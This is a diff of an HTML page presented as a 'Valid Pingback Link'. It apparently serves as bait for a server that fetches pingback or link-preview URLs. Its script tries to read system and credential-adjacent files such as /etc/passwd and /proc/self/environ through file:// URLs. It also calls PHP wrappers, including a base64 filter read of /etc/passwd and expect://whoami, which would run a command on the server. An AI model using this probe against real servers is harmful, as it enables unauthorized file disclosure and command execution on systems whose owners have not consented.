@@ -1,16 +1,39 @@
+<!-- file_read_test.html -->
 <!DOCTYPE html>
 <html>
 <body>
     <a href="https://about.fb.com/news/2026/01/meta-nuclear-energy-projects-power-american-ai-leadership/">
-        Link to article
+        Valid Pingback Link
     </a>
     
-    <!-- Try to load local file as image -->
-    <img src="file:///etc/passwd" style="display:none" 
-         onerror="console.log('Local file access attempted')">
-    <img src="file:///etc/hosts" style="display:none">
-    
-    <!-- Try PHP filter if server is PHP -->
-    <img src="php://filter/convert.base64-encode/resource=/etc/passwd" style="display:none">
+    <script>
+        // Test if file:// protocol works (unlikely but worth testing)
+        const fileTests = [
+            'file:///etc/passwd',
+            'file:///etc/hosts',
+            'file:///C:/Windows/System32/drivers/etc/hosts',
+            'file:///proc/self/environ',  // Environment variables
+            'file:///etc/issue',          // OS version
+        ];
+        
+        fileTests.forEach(url => {
+            const img = new Image();
+            img.onerror = function() {
+                console.log('Attempted:', url.substring(0, 30) + '...');
+            };
+            img.src = url;
+        });
+        
+        // Test PHP wrappers (if PHP is server side)
+        const phpWrappers = [
+            'php://filter/convert.base64-encode/resource=/etc/passwd',
+            'expect://whoami',
+            'data://text/plain;base64,SSB3YXMgaGVyZQ==',
+        ];
+        
+        phpWrappers.forEach(url => {
+            fetch(url).catch(() => {});
+        });
+    </script>
 </body>
 </html>
